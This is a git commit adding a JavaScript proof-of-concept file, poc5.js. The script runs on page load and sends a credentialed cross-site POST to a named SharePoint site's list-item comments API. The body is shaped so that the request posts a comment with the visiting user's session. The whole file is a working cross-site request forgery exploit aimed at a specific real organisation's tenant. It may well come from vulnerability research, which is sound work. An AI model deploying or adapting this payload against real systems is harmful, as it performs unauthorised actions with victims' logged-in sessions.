aa30180e329c389d39713a5a6e3499117bf1ba15
Chuu <36441023+uonghoangminhchau@users.noreply.github.com>
2025-10-01 15:26:37 +0700

    Create poc5.js

---
+++ poc5.js
@@ -0,0 +1,22 @@
+(function(){
+  const ACTION_URL = 'https://sacombankvn.sharepoint.com/sites/QunldnGBM/_api/web/lists(@a1)/GetItemById(@a2)/Comments()?@a1=%27%7B63c44e7f%2Dc900%2D437a%2Dbd07%2Da4ff273afc14%7D%27&@a2=%271%27';
+  const AUTO_RUN = true;
+
+  function send() {
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', ACTION_URL, true);
+    xhr.withCredentials = true;
+    xhr.setRequestHeader('Content-Type', 'text/plain;charset=UTF-8');
+    xhr.onload = function() { console.log('POST status:', xhr.status, 'response:', xhr.responseText); };
+    xhr.onerror = function() { console.error('Request error'); };
+    var name = '{"text":"-----2-----","mentions":[]}';
+    var body = name + '=';
+    xhr.send(body);
+  }
+
+  if (AUTO_RUN) {
+    setTimeout(()=> { try { send(); } catch(e) { console.error(e); } }, 50);
+  } else {
+    window.sendPoC = send;
+  }
+})();
